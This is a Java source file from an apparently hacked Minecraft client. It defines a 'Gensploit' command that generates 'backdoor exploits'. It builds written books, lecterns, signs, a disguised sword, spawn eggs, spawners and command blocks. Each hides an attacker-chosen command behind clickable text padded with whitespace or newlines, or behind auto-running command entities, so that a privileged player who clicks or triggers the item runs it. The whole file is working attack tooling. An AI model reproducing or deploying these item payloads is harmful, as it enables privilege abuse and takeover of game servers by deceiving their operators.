/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.shadow.client.feature.command.Command;
import net.shadow.client.feature.command.coloring.PossibleArgument;
import net.shadow.client.feature.gui.notifications.Notification;

public class Gensploit extends Command {

    Item item = Registry.ITEM.get(new Identifier("written_book"));
    ItemStack stack = new ItemStack(item, 1);
    NbtCompound tag;

    public Gensploit() {
        super("Gensploit", "Generate backdoor exploits really fast", "gs", "gensploit", "gsploit");
    }

    @Override
    public ExamplesEntry getExampleArguments() {
        //you and your horrible fucking example server shit can go burn in hell fuck this i'm makint it later
        //return new ExamplesEntry();
        return null;
    }

    @Override
    public PossibleArgument getSuggestionsWithType(int index, String[] args) {
        //return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.STRING, ));
        return null;
    }

    @Override
    public void onExecute(String[] args) {
        String itemname = ""; // find way to compile between the "" for these
        String mode = args[0];
        String text = ""; // find way to compile between the "" for these
        String command = "";// find way to compile between the "" for these
        String bookauthor = client.player.getGameProfile().getName();

        switch (mode) {
            case "book" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("written_book"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{title:\"" + itemname + "\",author:\"" + bookauthor + "\",pages:['{\"text\":\"" + text + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"}}','{\"text\":\"\"}','{\"text\":\"\"}']}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Book Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "sign" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("oak_sign"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname + "\"}'},BlockEntityTag:{Text1:'{\"text\":\"" + text + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"}}'}}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Sign Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "command block" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("command_block"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname + "\"}'},BlockEntityTag:{Command:\"" + command + "\",powered:0b,auto:1b}}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Command Block Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "spawn egg" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("cow_spawn_egg"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname + "\"}'},EntityTag:{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:spawner\"},TileEntityData:{SpawnCount:8,SpawnRange:5,Delay:0,MinSpawnDelay:100,MaxSpawnDelay:100,MaxNearbyEntities:50,RequiredPlayerRange:50,SpawnData:{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:redstone_block\"},Time:200,Passengers:[{id:\"minecraft:armor_stand\",Health:0f,Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:activator_rail\",Properties:{powered:\"true\"}},Time:1,Passengers:[{id:\"minecraft:command_block_minecart\",Command:\"" + command + "\"}]}]}]}},Time:200}}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Spawn Egg Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "sudosword" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("emerald"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{Enchantments:[{id:\"minecraft:sharpness\",lvl:255s}],display:{Name:'[{\"text\":\"Diamond Sword]\",\"color\":\"reset\",\"italic\":false},{\"text\":\"\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n[\",\"color\":\"reset\",\"italic\":false},{\"text\":\"" + text + " " + itemname + "\",\"color\":\"red\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"}}]'}}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "SudoSword Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "silent egg" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("cow_spawn_egg"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname + "\"}'},EntityTag:{Command:\"" + command + "\",Invulnerable:1b,Pos:[4.5d,1.0d,20.5d],id:\"minecraft:command_block_minecart\"}}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Silent Egg Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "spawner" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("spawner"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname + "\"}'},BlockEntityTag:{SpawnCount:4,SpawnRange:10,Delay:1,MinSpawnDelay:1,MaxSpawnDelay:1,MaxNearbyEntities:32767,RequiredPlayerRange:32767,SpawnData:{id:\"minecraft:pig\",Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:redstone_block\"},Time:1,Passengers:[{id:\"minecraft:armor_stand\",Health:0f,Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:activator_rail\"},Time:1,Passengers:[{id:\"minecraft:command_block_minecart\",Command:\"" + command + "\"}]}]}]}]},SpawnPotentials:[{Weight:1,Entity:{id:\"minecraft:pig\",Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:redstone_block\"},Time:1,Passengers:[{id:\"minecraft:armor_stand\",Health:0f,Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:activator_rail\"},Time:1,Passengers:[{id:\"minecraft:command_block_minecart\",Command:\"" + command + "\"}]}]}]}]}}]}}");
                    stack.setNbt(tag);

                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Spawner Exploit Created");
                } catch (Exception ignored) {
                }
            }

            case "lectern" -> {
                try {
                    item = Registry.ITEM.get(new Identifier("lectern"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{BlockEntityTag:{Book:{id:\"minecraft:written_book\",Count:1b,tag:{title:\"\",author:\"\",pages:['{\"text\":\"" + text + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command + "\"}}','{\"text\":\"\"}']}}}}");
                    stack.setNbt(tag);
                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
                    Notification.create(1000, "Gensploit", Notification.Type.INFO, "Lectern Exploit Created");
                } catch (Exception ignored) {
                }
            }
        }
    }
}
